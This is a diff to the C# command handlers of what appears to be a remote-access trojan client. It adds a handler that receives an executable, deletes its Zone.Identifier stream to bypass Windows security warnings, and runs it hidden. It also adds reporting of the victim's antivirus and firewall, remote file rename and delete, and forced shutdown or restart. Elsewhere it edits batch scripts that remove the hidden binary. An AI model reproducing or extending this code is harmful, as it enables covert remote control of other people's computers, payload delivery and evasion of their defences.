@@ -1,5 +1,6 @@
 ﻿using Client;
 using Core.RemoteShell;
+using SpeechLib;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -88,6 +89,43 @@ namespace Core.Commands
 			})).Start();
 		}
 
+		public static void HandleUploadAndExecute(Core.Packets.ServerPackets.UploadAndExecute command, Core.Client client)
+		{
+			new Thread(new ThreadStart(() =>
+			{
+				byte[] fileBytes = command.FileBytes;
+				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+
+				try
+				{
+					if (fileBytes[0] != 'M' && fileBytes[1] != 'Z')
+						throw new Exception("no pe file");
+
+					File.WriteAllBytes(tempFile, fileBytes);
+
+					DeleteFile(tempFile + ":Zone.Identifier");
+
+					ProcessStartInfo startInfo = new ProcessStartInfo();
+					if (command.RunHidden)
+					{
+						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+						startInfo.CreateNoWindow = true;
+					}
+					startInfo.UseShellExecute = command.RunHidden;
+					startInfo.FileName = tempFile;
+					Process.Start(startInfo);
+				}
+				catch
+				{
+					DeleteFile(tempFile);
+					new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+					return;
+				}
+
+				new Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+			})).Start();
+		}
+
 		public static void HandleUninstall(Core.Packets.ServerPackets.Uninstall command, Core.Client client)
 		{
 			new Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
@@ -137,13 +175,13 @@ namespace Core.Commands
 			string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ? 
 					"@echo off" + "\n" +
 					"echo DONT CLOSE THIS WINDOW!" + "\n" +
-					"ping -n 15 localhost > nul" + "\n" +
+					"ping -n 20 localhost > nul" + "\n" +
 					"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 					"del " + "\"" + filename + "\""
 				:
 					"@echo off" + "\n" +
 					"echo DONT CLOSE THIS WINDOW!" + "\n" +
-					"ping -n 15 localhost > nul" + "\n" +
+					"ping -n 20 localhost > nul" + "\n" +
 					"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 					"del " + "\"" + filename + "\""
 				;
@@ -320,7 +358,28 @@ namespace Core.Commands
 		{
 			try
 			{
-				new Core.Packets.ClientPackets.GetSystemInfoResponse(SystemCore.GetCpu(), SystemCore.GetRam(), SystemCore.GetGpu(), SystemCore.GetUsername(), SystemCore.GetPcName(), SystemCore.GetUptime(), SystemCore.GetLanIp(), SystemCore.WANIP).Execute(client);
+				string[] infoCollection = new string[20];
+				infoCollection[0] = "Processor (CPU)";
+				infoCollection[1] = SystemCore.GetCpu();
+				infoCollection[2] = "Memory (RAM)";
+				infoCollection[3] = string.Format("{0} MB", SystemCore.GetRam());
+				infoCollection[4] = "Video Card (GPU)";
+				infoCollection[5] = SystemCore.GetGpu();
+				infoCollection[6] = "Username";
+				infoCollection[7] = SystemCore.GetUsername();
+				infoCollection[8] = "PC Name";
+				infoCollection[9] = SystemCore.GetPcName();
+				infoCollection[10] = "Uptime";
+				infoCollection[11] = SystemCore.GetUptime();
+				infoCollection[12] = "LAN IP Address";
+				infoCollection[13] = SystemCore.GetLanIp();
+				infoCollection[14] = "WAN IP Address";
+				infoCollection[15] = SystemCore.WANIP;
+				infoCollection[16] = "Antivirus";
+				infoCollection[17] = SystemCore.GetAntivirus();
+				infoCollection[18] = "Firewall";
+				infoCollection[19] = SystemCore.GetFirewall();
+				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
 			{ }
@@ -361,6 +420,11 @@ namespace Core.Commands
 			}
 		}
 
+	    public static void HandleTextToSpeech(Core.Packets.ServerPackets.TextToSpeech command, Core.Client client)
+	    {
+            SpVoice Voice = new SpVoice();
+            Voice.Speak(command.Speech);
+	    }
 		public static void HandleShowMessageBox(Core.Packets.ServerPackets.ShowMessageBox command, Core.Client client)
 		{
 			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
@@ -407,7 +471,7 @@ namespace Core.Commands
 					string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
 							"@echo off" + "\n" +
 							"echo DONT CLOSE THIS WINDOW!" + "\n" +
-							"ping -n 15 localhost > nul" + "\n" +
+							"ping -n 20 localhost > nul" + "\n" +
 							"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
@@ -415,7 +479,7 @@ namespace Core.Commands
 						:
 							"@echo off" + "\n" +
 							"echo DONT CLOSE THIS WINDOW!" + "\n" +
-							"ping -n 15 localhost > nul" + "\n" +
+							"ping -n 20 localhost > nul" + "\n" +
 							"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
 							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
@@ -466,6 +530,70 @@ namespace Core.Commands
 			{
 				shell.CloseSession();
 				shell = null;
+			}
+		}
+
+		public static void HandleRename(Core.Packets.ServerPackets.Rename command, Core.Client client)
+		{
+			try
+			{
+				if (command.IsDir)
+					Directory.Move(command.Path, command.NewPath);
+				else
+					File.Move(command.Path, command.NewPath);
+
+				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
+			}
+			catch
+			{ }
+		}
+
+		public static void HandleDelete(Core.Packets.ServerPackets.Delete command, Core.Client client)
+		{
+			try
+			{
+				if (command.IsDir)
+					Directory.Delete(command.Path, true);
+				else
+					File.Delete(command.Path);
+
+				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
+			}
+			catch
+			{ }
+		}
+
+		public static void HandleAction(Core.Packets.ServerPackets.Action command, Core.Client client)
+		{
+			try
+			{
+				ProcessStartInfo startInfo = new ProcessStartInfo();
+				switch(command.Mode)
+				{
+					case 0:
+						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+						startInfo.CreateNoWindow = true;
+						startInfo.UseShellExecute = true;
+						startInfo.Arguments = "/s /t 0"; // shutdown
+						startInfo.FileName = "shutdown";
+						Process.Start(startInfo);
+						break;
+					case 1:
+						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+						startInfo.CreateNoWindow = true;
+						startInfo.UseShellExecute = true;
+						startInfo.Arguments = "/r /t 0"; // restart
+						startInfo.FileName = "shutdown";
+						Process.Start(startInfo);
+						break;
+					case 2:
+						Application.SetSuspendState(PowerState.Suspend, true, true); // standby
+						break;
+				}
+			}
+			catch
+			{
+				new Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
 			}
 		}
 	}
